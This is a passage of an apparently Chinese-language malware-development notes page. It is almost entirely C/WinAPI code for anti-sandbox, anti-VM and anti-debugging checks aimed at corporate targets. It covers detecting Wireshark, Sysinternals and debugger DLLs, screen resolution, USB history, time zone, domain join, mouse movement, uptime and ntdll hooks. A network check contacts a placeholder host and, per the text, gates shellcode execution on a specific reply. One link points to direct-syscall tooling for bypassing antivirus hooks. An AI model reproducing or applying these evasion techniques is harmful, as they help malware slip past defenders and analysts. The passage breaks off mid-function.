+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br></div></div><h3 id="枚举调试工具抓包工具"><a href="#枚举调试工具抓包工具" class="header-anchor">#</a> 枚举调试工具抓包工具</h3> <div class="language- line-numbers-mode"><pre class="language-text"><code>PROCESSENTRY32W processEntry = { 0 };
+processEntry.dwSize = sizeof(PROCESSENTRY32W);
+HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+WCHAR processName[MAX_PATH + 1];
+if (Process32FirstW(hSnapshot, &amp;processEntry))
+{
+do
+{
+	StringCchCopyW(processName, MAX_PATH, processEntry.szExeFile);
+	CharUpperW(processName);
+	if (wcsstr(processName, L&quot;WIRESHARK.EXE&quot;)) exit(0);
+} while (Process32NextW(hSnapshot, &amp;processEntry));
+}
+
+wprintf_s(L&quot;Now hacking...\n&quot;);
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br></div></div><h3 id="枚举每个进程的地址空间中加载的模块，并检查不需要的名称"><a href="#枚举每个进程的地址空间中加载的模块，并检查不需要的名称" class="header-anchor">#</a> 枚举每个进程的地址空间中加载的模块，并检查不需要的名称</h3> <div class="language- line-numbers-mode"><pre class="language-text"><code>DWORD runningProcessesIDs[1024];
+DWORD runningProcessesBytes;
+EnumProcesses(runningProcessesIDs, sizeof(runningProcessesIDs), &amp;runningProcessesBytes);
+for (int i = 0; i &lt; runningProcessesBytes / sizeof(DWORD); i++)
+{
+	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, runningProcessesIDs[i]);
+	if (!hProcess) continue;
+	HMODULE processModules[1024];
+	DWORD processModulesBytes;
+	int s1 = EnumProcessModules(hProcess, processModules, sizeof(processModules), &amp;processModulesBytes);
+	for (int j = 0; j &lt; processModulesBytes / sizeof(HMODULE); j++)
+	{
+		WCHAR moduleName[MAX_PATH + 1];
+		GetModuleFileNameExW(hProcess, processModules[j], moduleName, MAX_PATH);
+		CharUpperW(moduleName);
+		if (wcsstr(moduleName, L&quot;DBGHELP.DLL&quot;)) exit(0);
+	}
+}
+
+wprintf_s(L&quot;Now hacking...\n&quot;);
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br></div></div><h3 id="检查窗口名称，并将其与表示存在常见恶意软件分析工具的名称进行比较"><a href="#检查窗口名称，并将其与表示存在常见恶意软件分析工具的名称进行比较" class="header-anchor">#</a> 检查窗口名称，并将其与表示存在常见恶意软件分析工具的名称进行比较</h3> <div class="language- line-numbers-mode"><pre class="language-text"><code>BOOL CALLBACK EnumWindowsProc(HWND hWindow, LPARAM parameter)
+{
+	WCHAR windowTitle[1024];
+	GetWindowTextW(hWindow, windowTitle, sizeof(windowTitle));
+	CharUpperW(windowTitle);
+	if (wcsstr(windowTitle, L&quot;SYSINTERNALS&quot;)) *(PBOOL)parameter = true;
+	return true;
+}
+
+void main()
+{
+	bool debugged = false;
+	EnumWindows(EnumWindowsProc, (LPARAM)(&amp;debugged));
+	if (debugged) return;
+
+	wprintf_s(L&quot;Now hacking...\n&quot;);
+}
+
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br></div></div><h3 id="check-user-name-computer-name"><a href="#check-user-name-computer-name" class="header-anchor">#</a> check user name-computer name</h3> <div class="language- line-numbers-mode"><pre class="language-text"><code>//check computer name
+DWORD computerNameLength;
+wchar_t computerName[MAX_COMPUTERNAME_LENGTH + 1];
+GetComputerNameW(computerName, &amp;computerNameLength);
+CharUpperW(computerName);
+if (wcsstr(computerName, L&quot;DESKTOP-&quot;)) return false;
+
+//check user name
+DWORD userNameLength;
+wchar_t userName[UNLEN + 1];
+GetUserNameW(userName, &amp;userNameLength);
+CharUpperW(userName);
+if (wcsstr(userName, L&quot;ADMIN&quot;)) return false;
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><h3 id="由于我们通常针对公司环境，因此我们可以假设用户的计算机是域的成员。让我们检查机器的域加入状态："><a href="#由于我们通常针对公司环境，因此我们可以假设用户的计算机是域的成员。让我们检查机器的域加入状态：" class="header-anchor">#</a> 由于我们通常针对公司环境，因此我们可以假设用户的计算机是域的成员。让我们检查机器的域加入状态：</h3> <div class="language- line-numbers-mode"><pre class="language-text"><code>PWSTR domainName;
+NETSETUP_JOIN_STATUS status;
+NetGetJoinInformation(NULL, &amp;domainName, &amp;status);
+if (status != NetSetupDomainName) return false;
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><h3 id="分辨率检测"><a href="#分辨率检测" class="header-anchor">#</a> 分辨率检测</h3> <div class="language- line-numbers-mode"><pre class="language-text"><code>bool CALLBACK MyCallback(HMONITOR hMonitor, HDC hdcMonitor, LPRECT lpRect, LPARAM data)
+{
+	MONITORINFO monitorInfo;
+	monitorInfo.cbSize = sizeof(MONITORINFO);
+	GetMonitorInfoW(hMonitor, &amp;monitorInfo);
+	int xResolution = monitorInfo.rcMonitor.right - monitorInfo.rcMonitor.left;
+	int yResolution = monitorInfo.rcMonitor.top - monitorInfo.rcMonitor.bottom;
+	if (xResolution &lt; 0) xResolution = -xResolution;
+	if (yResolution &lt; 0) yResolution = -yResolution;
+	if ((xResolution != 1920 &amp;&amp; xResolution != 2560 &amp;&amp; xResolution != 1440)
+		|| (yResolution != 1080 &amp;&amp; yResolution != 1200 &amp;&amp; yResolution != 1600 &amp;&amp; yResolution != 900))
+	{
+		*((BOOL*)data) = true;
+	}
+	return true;
+}
+
+void main()
+{
+	MONITORENUMPROC pMyCallback = (MONITORENUMPROC)MyCallback;
+	int xResolution = GetSystemMetrics(SM_CXSCREEN);
+	int yResolution = GetSystemMetrics(SM_CYSCREEN);
+	if (xResolution &lt; 1000 &amp;&amp; yResolution &lt; 1000)  return false;
+
+	int numberOfMonitors = GetSystemMetrics(SM_CMONITORS);
+	bool sandbox = false;
+	EnumDisplayMonitors(NULL, NULL, pMyCallback, (LPARAM)(&amp;sandbox));
+	if (sandbox) return;
+
+	wprintf_s(L&quot;Now hacking...\n&quot;);
+}
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br></div></div><h3 id="usb存储检测"><a href="#usb存储检测" class="header-anchor">#</a> USB存储检测</h3> <div class="language- line-numbers-mode"><pre class="language-text"><code>HKEY hKey;
+DWORD mountedUSBDevicesCount;
+RegOpenKeyEx(HKEY_LOCAL_MACHINE, L&quot;SYSTEM\\ControlSet001\\Enum\\USBSTOR&quot;, 0, KEY_READ, &amp;hKey);
+RegQueryInfoKey(hKey, NULL, NULL, NULL, &amp;mountedUSBDevicesCount, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
+if (mountedUSBDevicesCount &lt; 1) return false;
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><h3 id="时区检测"><a href="#时区检测" class="header-anchor">#</a> 时区检测</h3> <div class="language- line-numbers-mode"><pre class="language-text"><code>SetThreadLocale(MAKELCID(MAKELANGID(LANG_ENGLISH, SUBLANG_ENGLISH_US), SORT_DEFAULT));
+DYNAMIC_TIME_ZONE_INFORMATION dynamicTimeZoneInfo;
+GetDynamicTimeZoneInformation(&amp;dynamicTimeZoneInfo);
+wchar_t timeZoneName[128 + 1];
+StringCchCopyW(timeZoneName, 128, dynamicTimeZoneInfo.TimeZoneKeyName);
+CharUpperW(timeZoneName);
+if (!wcsstr(timeZoneName, L&quot;CENTRAL EUROPEAN STANDARD TIME&quot;)) return false;
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><h3 id="语言检测"><a href="#语言检测" class="header-anchor">#</a> 语言检测</h3> <div class="language- line-numbers-mode"><pre class="language-text"><code>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="检测自动化分析"><a href="#检测自动化分析" class="header-anchor">#</a> 检测自动化分析</h2> <h3 id="网络连接"><a href="#网络连接" class="header-anchor">#</a> 网络连接</h3> <div class="language- line-numbers-mode"><pre class="language-text"><code>HINTERNET hSession = WinHttpOpen(L&quot;Mozilla 5.0&quot;, WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+HINTERNET hConnection = WinHttpConnect(hSession, L&quot;my.domain.or.ip&quot;, INTERNET_DEFAULT_HTTP_PORT, 0);
+HINTERNET hRequest = WinHttpOpenRequest(hConnection, L&quot;GET&quot;, L&quot;test&quot;, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, NULL);
+WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
+BOOL status = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
+if (!status) return false;
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p>收到特定resp 执行shellcode</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>HINTERNET hSession = WinHttpOpen(L&quot;Mozilla 5.0&quot;, WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+HINTERNET hConnection = WinHttpConnect(hSession, L&quot;my.domain.or.ip&quot;, INTERNET_DEFAULT_HTTP_PORT, 0);
+HINTERNET hRequest = WinHttpOpenRequest(hConnection, L&quot;GET&quot;, L&quot;test&quot;, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, NULL);
+WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
+WinHttpReceiveResponse(hRequest, 0);
+DWORD responseLength;
+WinHttpQueryDataAvailable(hRequest, &amp;responseLength);
+PVOID response = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, responseLength + 1);
+WinHttpReadData(hRequest, response, responseLength, &amp;responseLength);
+if (atoi((PSTR)response) != 1337) return false;
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><h3 id="用户交互"><a href="#用户交互" class="header-anchor">#</a> 用户交互</h3> <div class="language- line-numbers-mode"><pre class="language-text"><code>POINT currentMousePosition;
+POINT previousMousePosition;
+GetCursorPos(&amp;previousMousePosition);
+double mouseDistance = 0;
+while (true)
+{
+	GetCursorPos(&amp;currentMousePosition);
+	mouseDistance += sqrt(
+		pow(currentMousePosition.x - previousMousePosition.x, 2) +
+		pow(currentMousePosition.y - previousMousePosition.y, 2)
+	);
+	Sleep(100);
+	previousMousePosition = currentMousePosition;
+	if (mouseDistance &gt; 20000) break;
+}
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br></div></div><h3 id="最近文档数目"><a href="#最近文档数目" class="header-anchor">#</a> 最近文档数目</h3> <div class="language- line-numbers-mode"><pre class="language-text"><code>PWSTR recentFolder = NULL;
+SHGetKnownFolderPath(FOLDERID_Recent, 0, NULL, &amp;recentFolder);
+wchar_t recentFolderFiles[MAX_PATH + 1] = L&quot;&quot;;
+StringCbCatW(recentFolderFiles, MAX_PATH, recentFolder);
+StringCbCatW(recentFolderFiles, MAX_PATH, L&quot;\\*&quot;);
+int numberOfRecentFiles = 0;
+WIN32_FIND_DATAW findFileData;
+HANDLE hFind = FindFirstFileW(recentFolderFiles, &amp;findFileData);
+if (hFind != INVALID_HANDLE_VALUE)
+{
+	do
+	{
+		numberOfRecentFiles++;
+	} while (FindNextFileW(hFind, &amp;findFileData));
+}
+if (numberOfRecentFiles &gt;= 2) numberOfRecentFiles-=2; //exclude '.' and '..'
+if (numberOfRecentFiles &lt; 20) return false;
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br></div></div><h3 id="进程数"><a href="#进程数" class="header-anchor">#</a> 进程数</h3> <div class="language- line-numbers-mode"><pre class="language-text"><code>DWORD runningProcessesIDs[1024];
+DWORD runningProcessesCountBytes;
+DWORD runningProcessesCount;
+EnumProcesses(runningProcessesIDs, sizeof(runningProcessesIDs), &amp;runningProcessesCountBytes);
+runningProcessesCount = runningProcessesCountBytes / sizeof(DWORD);
+if (runningProcessesCount &lt; 50) return false;
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><h3 id="系统运行时间"><a href="#系统运行时间" class="header-anchor">#</a> 系统运行时间</h3> <div class="language- line-numbers-mode"><pre class="language-text"><code>ULONGLONG uptime = GetTickCount64() / 1000;
+if (uptime &lt; 1200) return false; //20 minutes
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><h3 id="延迟执行"><a href="#延迟执行" class="header-anchor">#</a> 延迟执行</h3> <div class="language- line-numbers-mode"><pre class="language-text"><code>ULONGLONG uptimeBeforeSleep = GetTickCount64();
+typedef NTSTATUS(WINAPI *PNtDelayExecution)(IN BOOLEAN, IN PLARGE_INTEGER);
+PNtDelayExecution pNtDelayExecution = (PNtDelayExecution)GetProcAddress(GetModuleHandleW(L&quot;ntdll.dll&quot;), &quot;NtDelayExecution&quot;);
+LARGE_INTEGER delay;
+delay.QuadPart = -10000 * 100000; // 100 seconds
+pNtDelayExecution(FALSE, &amp;delay);
+ULONGLONG uptimeAfterSleep = GetTickCount64();
+if ((uptimeAfterSleep - uptimeBeforeSleep) &lt; 100000) return false;
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><h3 id="内核用户共享数据"><a href="#内核用户共享数据" class="header-anchor">#</a> 内核用户共享数据</h3> <blockquote><p>一些复杂的沙箱可能会同时钩住两个Sleep功能（甚至是内核模式ZwDelayExecution；但是，我认为如今，内核钩子需要管理程序级别的访问）和GetTickCount64（或内核模式KeQueryTickCount）。我们可以使用KUSER_SHARED_DATA系统内核与用户模式（当然是只读模式）共享的结构，其中包含有关“滴答计数”的信息。这种结构它始终位于存储器（0x7ffe0000）中的同一地址。实际的系统正常运行时间（KSYSTEM_TIME结构）存储在偏移量0x320中。我们可以从系统的内存中读取它，并用来检查与滴答计数相关的功能是否被沙箱操纵：(谷歌翻译)</p></blockquote> <div class="language- line-numbers-mode"><pre class="language-text"><code>Sleep(1000000);
+ULONG *PUserSharedData_TickCountMultiplier = (PULONG)0x7ffe0004;
+LONG *PUserSharedData_High1Time = (PLONG)0x7ffe0324;
+ULONG *PUserSharedData_LowPart = (PULONG)0x7ffe0320;
+DWORD time = GetTickCount64();
+DWORD kernelTime = (*PUserSharedData_TickCountMultiplier) * (*PUserSharedData_High1Time &lt;&lt; 8) +
+	((*PUserSharedData_LowPart) * (unsigned __int64)(*PUserSharedData_TickCountMultiplier) &gt;&gt; 24);
+if ((time - kernelTime) &gt; 100 &amp;&amp; (kernelTime - time) &gt; 100) return false;
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><h3 id="函数hook"><a href="#函数hook" class="header-anchor">#</a> 函数Hook</h3> <div class="language- line-numbers-mode"><pre class="language-text"><code>// manually load the dll
+HANDLE dllFile = CreateFileW(L&quot;C:\\Windows\\System32\\ntdll.dll&quot;, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+DWORD dllFileSize = GetFileSize(dllFile, NULL);
+HANDLE hDllFileMapping = CreateFileMappingW(dllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
+HANDLE pDllFileMappingBase = MapViewOfFile(hDllFileMapping, FILE_MAP_READ, 0, 0, 0);
+CloseHandle(dllFile);
+
+// analyze the dll
+PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pDllFileMappingBase;
+PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((PBYTE)pDllFileMappingBase + pDosHeader-&gt;e_lfanew);
+PIMAGE_OPTIONAL_HEADER pOptionalHeader = (PIMAGE_OPTIONAL_HEADER)&amp;(pNtHeader-&gt;OptionalHeader);
+PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pDllFileMappingBase + pOptionalHeader-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+PULONG pAddressOfFunctions = (PULONG)((PBYTE)pDllFileMappingBase + pExportDirectory-&gt;AddressOfFunctions);
+PULONG pAddressOfNames = (PULONG)((PBYTE)pDllFileMappingBase + pExportDirectory-&gt;AddressOfNames);
+PUSHORT pAddressOfNameOrdinals = (PUSHORT)((PBYTE)pDllFileMappingBase + pExportDirectory-&gt;AddressOfNameOrdinals);
+
+// find the original function code
+PVOID pNtCreateThreadExOriginal = NULL;
+for (int i = 0; i &lt; pExportDirectory-&gt;NumberOfNames; ++i)
+{
+	PCSTR pFunctionName = (PSTR)((PBYTE)pDllFileMappingBase + pAddressOfNames[i]);
+	if (!strcmp(pFunctionName, &quot;NtCreateThreadEx&quot;))
+	{
+		pNtCreateThreadExOriginal = (PVOID)((PBYTE)pDllFileMappingBase + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
+		break;
+	}
+}
+
+// compare functions
+PVOID pNtCreateThreadEx = GetProcAddress(GetModuleHandleW(L&quot;ntdll.dll&quot;), &quot;NtCreateThreadEx&quot;);
+if (memcmp(pNtCreateThreadEx, pNtCreateThreadExOriginal, 16)) return false;
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br></div></div><h2 id="直接系统调用绕过-av-apihook"><a href="#直接系统调用绕过-av-apihook" class="header-anchor">#</a> 直接系统调用绕过 AV-ApiHook</h2> <p>https://github.com/jthuraisamy/SysWhispers/</p> <h2 id="反调试"><a href="#反调试" class="header-anchor">#</a> 反调试</h2> <div class="language- line-numbers-mode"><pre class="language-text"><code>if (IsDebuggerPresent()) return;
+	
+// same check
+PPEB pPEB = (PPEB)__readgsqword(0x60);
+if (pPEB-&gt;BeingDebugged) return;
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><div class="language- line-numbers-mode"><pre class="language-text"><code>BOOL isDebuggerPresent = FALSE;
+CheckRemoteDebuggerPresent(GetCurrentProcess(), &amp;isDebuggerPresent);
+if (isDebuggerPresent) return;
+
+// same check
+typedef NTSTATUS(WINAPI *PNtQueryInformationProcess)(IN  HANDLE, IN  PROCESSINFOCLASS, OUT PVOID, IN ULONG, OUT PULONG);
+PNtQueryInformationProcess pNtQueryInformationProcess = (PNtQueryInformationProcess)GetProcAddress(GetModuleHandleW(L&quot;ntdll.dll&quot;), &quot;NtQueryInformationProcess&quot;);
+DWORD64 isDebuggerPresent2 = 0;
+pNtQueryInformationProcess(GetCurrentProcess(), ProcessDebugPort, &amp;isDebuggerPresent2, sizeof DWORD64, NULL);
+if (isDebuggerPresent2) return;
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><h3 id="通过检查代码中的更改来检测断点"><a href="#通过检查代码中的更改来检测断点" class="header-anchor">#</a> 通过检查代码中的更改来检测断点</h3> <div class="language- line-numbers-mode"><pre class="language-text"><code>#pragma comment(linker, &quot;/INCREMENTAL:YES&quot;)
+
+DWORD CalculateFunctionChecksum(PUCHAR functionStart, PUCHAR functionEnd)
+{
+	DWORD checksum = 0;
+	while(functionStart &lt; functionEnd)
+	{
+		checksum += *functionStart;
+		functionStart++;
+	}
+	return checksum;
+}
+#pragma auto_inline(off)
+VOID CrucialFunction()
+{
+	int x = 0;
+	x += 2;
+}
+VOID AfterCrucialFunction()
+{
+};
+#pragma auto_inline(on)
+
+void main()
+{
+	DWORD originalChecksum = 3429;
+	DWORD checksum = CalculateFunctionChecksum((PUCHAR)CrucialFunction, (PUCHAR)AfterCrucialFunction);
+	if (checksum != originalChecksum) return;
+	
+	wprintf_s(L&quot;Now hacking...\n&quot;);
+}
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br></div></div><h3 id="通过检查内存页权限来检测断点"><a href="#通过检查内存页权限来检测断点" class="header-anchor">#</a> 通过检查内存页权限来检测断点</h3> <div class="language- line-numbers-mode"><pre class="language-text"><code>BOOL debugged = false;
+
+PSAPI_WORKING_SET_INFORMATION workingSetInfo;
+QueryWorkingSet(GetCurrentProcess(), &amp;workingSetInfo, sizeof workingSetInfo);
+DWORD requiredSize = sizeof PSAPI_WORKING_SET_INFORMATION * (workingSetInfo.NumberOfEntries + 20);
+PPSAPI_WORKING_SET_INFORMATION pWorkingSetInfo = (PPSAPI_WORKING_SET_INFORMATION)VirtualAlloc(0, requiredSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+BOOL s = QueryWorkingSet(GetCurrentProcess(), pWorkingSetInfo, requiredSize);
+for (int i = 0; i &lt; pWorkingSetInfo-&gt;NumberOfEntries; i++)
+{
+	PVOID physicalAddress = (PVOID)(pWorkingSetInfo-&gt;WorkingSetInfo[i].VirtualPage * 4096);
+	MEMORY_BASIC_INFORMATION memoryInfo;
+	VirtualQuery((PVOID)physicalAddress, &amp;memoryInfo, sizeof memoryInfo);
+	if (memoryInfo.Protect &amp; (PAGE_EXECUTE | PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE | PAGE_EXECUTE_WRITECOPY))
+	{
+		if ((pWorkingSetInfo-&gt;WorkingSetInfo[i].Shared == 0) || (pWorkingSetInfo-&gt;WorkingSetInfo[i].ShareCount == 0))
+		{
+			debugged = true;
+			break;
+		}
+	}
+}
+
+if (debugged) return;
+
+wprintf_s(L&quot;Now hacking...\n&quot;);
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br></div></div><h3 id="异常处理程序检测调试"><a href="#异常处理程序检测调试" class="header-anchor">#</a> 异常处理程序检测调试</h3> <div class="language- line-numbers-mode"><pre class="language-text"><code>BOOL isDebugged = TRUE;
+
+LONG WINAPI CustomUnhandledExceptionFilter(PEXCEPTION_POINTERS pExceptionPointers)
+{
+	isDebugged = FALSE;
+	return EXCEPTION_CONTINUE_EXECUTION;
+}
+
+void main()
+{
